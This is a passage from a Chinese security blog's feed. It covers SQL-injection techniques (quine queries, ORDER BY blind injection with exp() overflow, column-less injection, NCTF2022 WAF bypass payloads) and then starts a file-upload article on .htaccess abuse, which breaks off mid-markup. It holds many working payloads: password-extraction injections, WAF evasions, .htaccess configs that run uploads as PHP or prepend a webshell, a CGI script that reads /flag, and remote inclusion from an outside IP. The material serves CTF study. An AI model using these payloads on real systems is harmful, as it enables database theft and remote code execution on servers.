class="comment">---------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> REPLACE(<span class="string">&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;</span>,<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> REPLACE(&quot;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&quot;,<span class="type">CHAR</span>(<span class="number">46</span>),&quot;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&quot;) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.0005</span> sec)</span><br></pre></td></tr></table></figure><p>解决单双引号</p><p>细心点的话就会发现，这里还存在单双引号的问题，我们重新考虑存在单双引号的情况。</p><p><code>Quine</code>的基本形式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(<span class="string">&#x27;str&#x27;</span>,编码的间隔符,<span class="string">&#x27;str&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>str</code>描述为如下形式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&quot;间隔符&quot;,编码的间隔符,&quot;间隔符&quot;)</span><br></pre></td></tr></table></figure><p>这里<code>str</code>中的间隔符使用双引号的原因是，<code>str</code>已经被单引号包裹，为避免引入新的转义符号，间隔符需要使用双引号。</p><p>运算后的结果是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&quot;str&quot;,编码的间隔符,&quot;str&quot;)</span><br></pre></td></tr></table></figure><p>但是我们希望<code>str</code>仍然使用单引号包裹，怎么办？</p><p>我们这样考虑，如果先使用<code>REPLACE</code>将<code>str</code>的双引号换成单引号，这样最后就不会出现引号不一致的情况了。</p><p><code>Quine</code>的升级版基本形式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(REPLACE(<span class="string">&#x27;str&#x27;</span>,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),编码的间隔符,<span class="string">&#x27;str&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>str</code>的升级版形式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(REPLACE(&quot;间隔符&quot;,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),编码的间隔符,&quot;间隔符&quot;)</span><br></pre></td></tr></table></figure><p>这里的<code>CHAR(34)</code>是双引号，<code>CHAR(39)</code>是单引号，如果<code>CHAR</code>被禁了<code>0x22</code>和<code>0x27</code>是一样的效果。</p><p>这里我们慢一点。</p><p>第一步：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(REPLACE(&quot;间隔符&quot;,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),编码的间隔符,&quot;间隔符&quot;)</span><br><span class="line">变成了</span><br><span class="line">REPLACE(REPLACE(<span class="string">&#x27;间隔符&#x27;</span>,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),编码的间隔符,<span class="string">&#x27;间隔符&#x27;</span>)</span><br></pre></td></tr></table></figure><p>第二步：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(<span class="string">&#x27;单引号str&#x27;</span>,编码的间隔符,<span class="string">&#x27;str&#x27;</span>)</span><br><span class="line">变成了</span><br><span class="line">REPLACE(REPLACE(<span class="string">&#x27;str&#x27;</span>,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),编码的间隔符,<span class="string">&#x27;str&#x27;</span>)</span><br></pre></td></tr></table></figure><p>我们同样举刚才的例子，设间隔符为<code>&#39;.&#39;</code>，编码的间隔符为<code>CHAR(46)</code>，那么<code>str</code>为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(REPLACE(&quot;.&quot;,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">46</span>),&quot;.&quot;)</span><br></pre></td></tr></table></figure><p>放入最后的语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(REPLACE(<span class="string">&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;</span>,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure><p>执行的结果为（先执行的内层<code>REPLACE</code>）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(REPLACE(<span class="string">&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;</span>,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure><p>实际结果：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> MySQL  localhost:<span class="number">3306</span> ssl  <span class="keyword">SQL</span> <span class="operator">&gt;</span> <span class="keyword">SELECT</span> REPLACE(REPLACE(<span class="string">&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;</span>,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> REPLACE(REPLACE(<span class="string">&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;</span>,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> REPLACE(REPLACE(<span class="string">&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;</span>,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.0004</span> sec)</span><br></pre></td></tr></table></figure><p>现在就完全一致了。</p><h4 id="排序注入"><a href="#排序注入" class="headerlink" title="排序注入"></a>排序注入</h4><p>在SQL语言中，Order By语句主要用于对结果集进行排序。既然跟数据库交互有关，自然而然就会想到SQL注入的防护问题，第一时间想到的方案就是预编译了。但是采用预编译执行SQL语句传入的参数不能作为SQL语句的一部分，，那么Order By后的字段名、或者是 desc\asc 也不能预编译处理，那么也就是说Order By场景的排序规则还是只能使用拼接，这时候如果在开发阶段没有处理好，那么就很可能导致SQL注入问题了。排序也一直是注入的重灾区。</p><p><strong>挖掘思路</strong></p><p>存在关键参数值 desc</p><p>如下图</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/e6f5f872fce04115972e8c002cded0f4.png" alt="img"></p><p><strong>检测方法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">,1 &amp;&amp; ,0</span><br><span class="line"></span><br><span class="line">,1/1 &amp;&amp; ,1/0</span><br><span class="line"></span><br><span class="line">,exp(71) &amp;&amp; ,exp(710)</span><br></pre></td></tr></table></figure><p>异或</p><p><strong>三、排序注入挖掘</strong></p><p>这里使用的是 exp()   &#x2F;&#x2F;数值大于709就会溢出</p><p>Poc： AdminID+desc,exp(7)</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/f300b02e8268461484374f80130f4c86.png" alt="img"></p><p>Poc:AdminID+desc,exp(710)</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/3ea9c97a93564785b7128c9f047bcea9.png" alt="img"></p><p>此时不难发现，溢出时，响应时间比较长</p><p>所以在盲注中，建议条件为真时溢出</p><p>Poc 开始变形</p><p>Poc:AdminID+desc,if(user()+like+’r%’,exp(710),exp(7))</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/d7de9c78d86c4932a53db3a028758eed.png" alt="img"></p><p>Poc:AdminID+desc,if(user()+like+’c%’,exp(710),exp(7))</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/28574091b2c948559e9d4be4e6f8a914.png" alt="img"></p><p><strong>四、排序注入—补充</strong></p><p>1、因果的因</p><p>最近碰到挺多排序注入（关键字：orderby，desc，asc等）构造的poc大多为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>,if(<span class="number">1</span>,<span class="built_in">exp</span>(<span class="number">789</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>,<span class="keyword">case</span><span class="operator">+</span><span class="keyword">when</span><span class="operator">+</span>hex(mid(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">63</span><span class="operator">+</span><span class="keyword">then</span><span class="operator">+</span><span class="built_in">exp</span>(<span class="number">789</span>)<span class="operator">+</span><span class="keyword">else</span><span class="operator">+</span><span class="built_in">exp</span>(<span class="number">0</span>)<span class="operator">+</span><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>（poc的书写取决于站点是否对相关函数、单引号有所拦截）</p><p>总之都是利用盲注的方式来获取数据，从基础的poc fuzz到poc2、poc3甚至poc4，取决于waf的强弱、个人习惯。</p><p>2、因果的果</p><p>图一是使用报错注入获取用户名</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/80f20149c1734da69abd862488a168a0.png" alt="img"></p><p>图二是验证此poc是否可用（图一图二是同一系统不同的注入点）</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1c2553937d6e4af18a499ea60a7374b2.png" alt="img"></p><p>图三是在有waf的情况下使用</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/e1eeabfaae684531ab8af81f6adb8353.png" alt="img"></p><h4 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;union/**/select/**/1,2,group_concat(`1`)/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/ctftraining.flag)a/**/union/**/select/**/1,2,3/**/&#x27;1</span><br></pre></td></tr></table></figure><h4 id="NCTF2022"><a href="#NCTF2022" class="headerlink" title="NCTF2022"></a>NCTF2022</h4><h5 id="mod-security防火墙"><a href="#mod-security防火墙" class="headerlink" title="mod_security防火墙"></a>mod_security防火墙</h5><p>NCTF遇到的一个很恶心的waf</p><p><strong>用1.e可以绕过</strong></p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20221205120416138.png" alt="image-20221205120416138" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1 or  1.e(updatexml(1,concat(0x7,substring((select(password)from info),1,50)),0))  </span><br><span class="line">或者 1^(1.e(ascii 1.e(substr(1.e(select password from info where id =1) 1.e,2 1.e,1 1.e)1.e)1.e) =99)</span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20221205120354336.png" alt="image-20221205120354336" style="zoom: 50%;" /><p>sqlmap一把嗦……靠</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20221206142016908.png" alt="image-20221206142016908" style="zoom:80%;" /><p>官方payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@.:=right(right((select hex(password) from users.info where id =1 limit 0,1),1111),1111) union%23%0adistinctrow%0bselect@.</span><br></pre></td></tr></table></figure><p>不过还是能学到一种新姿势    <strong>gtid_subset()</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gtid_subset(concat(0x7e,(select/**/database/**/()),0x7e),71)</span><br></pre></td></tr></table></figure><h4 id="新型sql"><a href="#新型sql" class="headerlink" title="新型sql"></a>新型sql</h4><p>foodAPI存在语法bug，参考这道题目：<a href="https://blog.huli.tw/2022/10/31/hacklu-ctf-2022-writeup/">https://blog.huli.tw/2022/10/31/hacklu-ctf-2022-writeup/</a> </p><p>这两种不会出错 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select id from food where `not_exist&#x27;` and 0 union select 1; </span><br><span class="line">select id from food where `not_exist&#x27;` in () union select 1; </span><br></pre></td></tr></table></figure><p>payload： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flight?id=1&amp;?=`in()+union+select+1,flag+from+flag;</span><br></pre></td></tr></table></figure><p>官方wp：</p><p>deno的day，和去年出的ez_sql有点像。<br>两个问题：<br>一是SQL语句build的方式。<br>二是参数注入后列名中会产生带有引号的不存在的列名。<br>SQLite where子句中的in()会被忽略，利用这一点可以解决第二个问题。<br>第一个问题通过源码不难发现在生成最终的SQL语句时，使用了?作为占位符，因此可以通过在列名中传入?造成注入。</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flight??=`in()%20union%20select%202333,flag%20from%20flag;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;常用闭合方式判断&lt;br&gt;判断闭合方式，目前掌握的闭合方式为单引号’’，单引号括号(’’)，双引号””，双引号括号(“”)，都不行的话试试宽字节注入&lt;/p&gt;
&lt;p&gt;当单引号或者双引号出现回显或者语法错误时，如何判断是否带括号呢？&lt;/p&gt;
&lt;p&gt;抄袭一波大神的判断方式&lt;/p&gt;
</summary>
      
    
    
    
    <category term="漏洞总结" scheme="https://micgo.top/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="sql注入" scheme="https://micgo.top/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>文件上传</title>
    <link href="https://micgo.top/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://micgo.top/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2022-07-17T16:00:00.000Z</published>
    <updated>2023-03-16T04:04:43.007Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://i0.hdslb.com/bfs/album/851edba133d86315d1459fa33f7eaa21de436b58.png" alt="a2905b34fc76e7d68c4c04e63899cef9.png"></p><h4 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h4><p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：<strong>网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</strong></p><p>需要注意，.htaccess文件的作用域为其所在目录与其所有的子目录，若是子目录也存在.htaccess文件，则会覆盖父目录的.htaccess效果。</p><p>注意：**.htaccess 中有 <code>#</code> 单行注释符，且支持 <code>\</code> 拼接上下两行**</p><p>（1）.htaccess参数</p><p>常见配法有以下几种：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php5-script  .jpg             //Addhandler 使用 php5-script 处理器来解析所匹配到的文件。</span><br><span class="line">AddType    application/x-httpd-php .jpg  //AddType 将特定扩展名文件映射为php文件类型。</span><br><span class="line">Sethandler application/x-httpd-php       //Sethandler 将该目录及子目录的所有文件均映射为php文件类型</span><br><span class="line"></span><br><span class="line">&lt;FilesMatch &quot;filename&quot;&gt;                  //指定文件名的文件，才能被当做PHP解析</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>（2）auto_append_file参数</p><p>php.ini中有两项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file 在页面顶部加载文件</span><br><span class="line">auto_append_file  在页面底部加载文件</span><br></pre></td></tr></table></figure><p>使用这种方法可以不需要改动任何页面，当需要修改顶部或底部require文件时，只需要修改auto_prepend_file与auto_append_file的值即可。</p><p>在需要顶部或底部加载文件的文件夹中加入.htaccess文件，内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file &quot;/home/fdipzone/header.php&quot;</span><br><span class="line">php_value auto_append_file  &quot;/home/fdipzone/footer.php&quot;</span><br></pre></td></tr></table></figure><p>这样在指定.htaccess的文件夹内的页面文件才会加载 &#x2F;home&#x2F;fdipzone&#x2F;header.php 与 &#x2F;home&#x2F;fdipzone&#x2F;footer.php，其他页面文件不受影响。</p><p>  (3) 查看所有访问本站的记录</p><blockquote><p>这种方式利用了apache的服务器状态信息(默认关闭)，可以查看所有访问本站的记录<br>可添加参数?refresh&#x3D;n来实现每隔ns自动刷新<br>例如：127.0.0.1&#x2F;server-status?refresh&#x3D;5</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler server-status</span><br></pre></td></tr></table></figure><p> (4) 这种方法条件为apache加载了cgi_module，开启了fastcgi也是可以利用的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .xx</span><br></pre></td></tr></table></figure><p>编辑1.xx（注意格式比较严格）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#! /bin/bash</span><br><span class="line">echo Content-type: text/html</span><br><span class="line">echo &quot;&quot;</span><br><span class="line">cat /flag</span><br></pre></td></tr></table></figure><p><img src="https://i0.hdslb.com/bfs/album/e28b6b115c03ecfb73d934f17d532d96aed565a8.png" alt="在这里插入图片描述"></p><p>  (5) 这种方式可通过php_value来配置PHP的配置选项；另外php_flag name on|off用来设定布尔值的配置指令<br>由图可知，.htaccess可以使两种配置模式生效：PHP_INI_PREDIR和PHP_INI_ALL<br>可查看php.ini配置选项列表，从中寻找可利用的配置项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">（1）使用文件包含的两个相关配置</span><br><span class="line">auto_prepend_file：指定一个文件，在主文件解析之前自动解析</span><br><span class="line">auto_append_file：指定一个文件，在主文件解析后自动解析</span><br><span class="line">由于通过设置这两个选项进行文件包含，那么便可使用相关的php协议流，如php://filter，可用来绕过对一些关键字的检测</span><br><span class="line">（2）绕过preg_math的配置</span><br><span class="line">（3）利用inclue_path包含恶意文件</span><br><span class="line">（4）强制开启短标签</span><br><span class="line">（5）利用error log写本地文件 (html编码)</span><br><span class="line"></span><br><span class="line">（1）</span><br><span class="line">php_value auto_prepend_file webshell</span><br><span class="line">or</span><br><span class="line">php_value auto_append_file webshell</span><br><span class="line"></span><br><span class="line">&lt;?=phpinfo();</span><br><span class="line"></span><br><span class="line">（2）</span><br><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br><span class="line"></span><br><span class="line">（3）</span><br><span class="line"> php_value include_path &quot;/tmp&quot;</span><br><span class="line"></span><br><span class="line">（4）</span><br><span class="line">php_value short_open_tag 1</span><br><span class="line"></span><br><span class="line">（5）</span><br><span class="line"> php_value error_log /tmp/fl3g.php</span><br><span class="line"> php_value error_reporting 32767</span><br></pre></td></tr></table></figure><p>（6）禁用拒绝规则，使.htaccess可访问（默认情况下，.htaccess是不可访问的）<br>         编辑.htaccess文件，添加如下配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ &quot;^.ht&quot;&gt;</span><br><span class="line"> Require all granted</span><br><span class="line"> Order allow,deny</span><br><span class="line"> Allow from all</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line"># &lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p>例如上面这个.htaccess文件，首先设置了禁用拒绝规则，这样便可直接访问到.htaccess；接着用SetHandler将所有文件作为php解析，最后写入php代码，开头用#注释掉，这样便可成功解析.htaccess，然后解析php</p><h6 id="（7）-htaccess在重定向中的利用"><a href="#（7）-htaccess在重定向中的利用" class="headerlink" title="（7）**.htaccess在重定向中的利用**"></a>（7）**.htaccess在重定向中的利用**</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">如果不是目录，才会执行下一条RewriteRule</span><br><span class="line"></span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">如果不是文件，才会执行下一条RewriteRule</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Tokyo Westerns / MMA CTF 2nd 2016应用</span><br><span class="line">题目要求访问/admin，但访问需要登录密码（是在Apache中设置的），但是密码破解难度极大，并且不存在其他绕过技巧（maybe）;只有.htaccess重定向绕过的方法可行</span><br><span class="line"></span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">RewriteRule ^ index.php [QSA,L]</span><br><span class="line">然后访问 /index.php/admin， 即可达到访问 /admin 的效果，同时绕过Apache的密码</span><br><span class="line"></span><br><span class="line">注：</span><br><span class="line">RewriteRule ^ index.php [QSA,L]</span><br><span class="line">标签 [QSA,PT,L]</span><br><span class="line">QSA：表示保留参数如get传值?xxx==xx…；</span><br><span class="line">PT：再把这个URL交给Apache处理；</span><br><span class="line">L：作为最后一条；</span><br></pre></td></tr></table></figure><p>  (8) 查看源码</p><p>我们可以通过 .htaccess 文件的 php_flag 指令对 PHP 的 engine 配置选项进行设定，当把 engine 的值设为 off（或 0）时可以禁用一个本目录和子目录中的 PHP 解析，此时将会造成源码泄露：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag engine 0</span><br></pre></td></tr></table></figure><p><img src="https://i0.hdslb.com/bfs/album/ecf492ed72533e425f582be929e627c9168377a5.png" alt="img"></p><p>使用.htaccess设置，比较灵活，不需要重启服务器，也不需要管理员权限，唯一缺点是目录中每个被读取和被解释的文件每次都要进行处理，而不是在启动时处理一次，所以性能会有所降低。</p><p>一个 .htaccess文件示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType   application/x-httpd-php .html</span><br><span class="line">php_value auto_append_file        &quot;php://filter/convert.base64-decode/resource=a.html&quot;</span><br></pre></td></tr></table></figure><h5 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h5><p>PHP 的 allow_url_include 配置选项这个选项默认是关闭的，如果开启的话就可以进行远程包含。因为 allow_url_include 的配置范围为 PHP_INI_SYSTEM，所以无法利用 php_flag 指令在 .htaccess 文件中开启。这里为了演示，就先在 php.ini 中设置 allow_url_include 为 On</p><p>.htaccess 文件中的设置为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file http:<span class="comment">//192.168.0.181/phpinfo.txt</span></span><br><span class="line">或:</span><br><span class="line">php_value auto_append_file http:<span class="comment">//192.168.0.181/phpinfo.txt</span></span><br></pre></td></tr></table></figure><p>远程主机上的phpinfo.txt中的内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这样，最终目标主机上的php文件都会包含这个远程主机上的 phpinfo.txt 并解析执行：</p><p><a href="https://p3.ssl.qhimg.com/t0173bea0d52430bebf.png"><img src="https://i0.hdslb.com/bfs/album/7e4d4d7cda598446c510371ff7e057687b57d1a8.png" alt="img"></a></p><h5 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h5><h6 id="通过-PHP-伪协议"><a href="#通过-PHP-伪协议" class="headerlink" title="通过 PHP 伪协议"></a>通过 PHP 伪协议</h6><p>这里主要用的还是 auto_prepend_file 或 auto_append_file 这两个配置项。</p><p>条件：</p><ul><li>allow_url_fopen 为 On</li><li>allow_url_include 为 On</li><li>目标环境的当前目录中存在至少一个 PHP 文件</li></ul><figure class="highlight php"><table><tr><td 